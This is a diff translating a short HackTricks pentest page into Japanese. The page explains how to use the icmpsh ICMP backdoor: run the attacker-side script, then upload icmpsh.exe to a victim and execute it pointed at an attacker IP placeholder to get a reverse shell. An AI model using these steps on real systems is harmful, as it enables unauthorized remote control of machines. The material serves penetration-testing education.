@@ -1,31 +1,25 @@
 {{#include ../banners/hacktricks-training.md}}
 
-Download the backdoor from: [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)
+バックドアをダウンロードする: [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)
 
-# Client side
+# クライアント側
 
-Execute the script: **run.sh**
+スクリプトを実行する: **run.sh**
 
-**If you get some error, try to change the lines:**
-
+**エラーが発生した場合は、行を変更してみてください:**
 ```bash
 IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
 IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
 ```
-
-**For:**
-
+**対象:**
 ```bash
 echo Please insert the IP where you want to listen
 read IP
 ```
+# **被害者側**
 
-# **Victim Side**
-
-Upload **icmpsh.exe** to the victim and execute:
-
+**icmpsh.exe** を被害者にアップロードし、実行します:
 ```bash
 icmpsh.exe -t <Attacker-IP> -d 500 -b 30 -s 128
 ```
-
 {{#include ../banners/hacktricks-training.md}}
